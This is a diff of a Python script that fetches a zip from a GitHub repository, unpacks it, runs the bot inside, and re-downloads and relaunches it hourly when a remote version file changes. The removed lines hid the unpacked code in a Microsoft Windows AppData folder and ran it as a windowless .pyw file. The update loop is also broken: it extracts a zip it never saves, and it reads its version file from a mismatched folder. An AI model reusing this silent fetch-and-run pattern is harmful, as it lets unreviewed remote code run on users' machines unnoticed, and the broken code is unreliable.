@@ -32,20 +32,26 @@ time.sleep(3)
 import requests
 import win32com.client
 
-user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-os.makedirs(target_path, exist_ok=True)
-
 r = requests.get("https://github.com/noel-create/termux/archive/refs/heads/bot.zip", allow_redirects=True)
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
+file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'termux-bot.zip')
 open(file_path, 'wb').write(r.content)
 with zipfile.ZipFile(file_path, 'r') as zip_ref:
-    zip_ref.extractall(target_path)
+    zip_ref.extractall("/data/data/com.termux/files/usr")
 os.remove(file_path)
 
-process = subprocess.Popen(["python", os.path.join(target_path, "skibidi-startup", "startup.pyw")])
+process = subprocess.Popen(["python", os.path.join("/data/data/com.termux/files/usr", "termux-bot", "bot.py")])
 
 while True:
     time.sleep(3600)
     r = requests.get("https://raw.githubusercontent.com/noel-create/termux/refs/heads/main/version")
     p1 = r.text
+    with open("/data/data/com.termux/files/usr/termux-main/version", 'r') as f:
+        p2 = f.read()
+    if p1 != p2:
+        process.terminate()
+        r = requests.get("https://github.com/noel-create/termux/archive/refs/heads/bot.zip", allow_redirects=True)
+        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'termux-bot.zip')
+        with zipfile.ZipFile(file_path, 'r') as zip_ref:
+            zip_ref.extractall("/data/data/com.termux/files/usr")
+        os.remove(file_path)
+        process = subprocess.Popen(["python", os.path.join("/data/data/com.termux/files/usr", "termux-bot", "bot.py")])
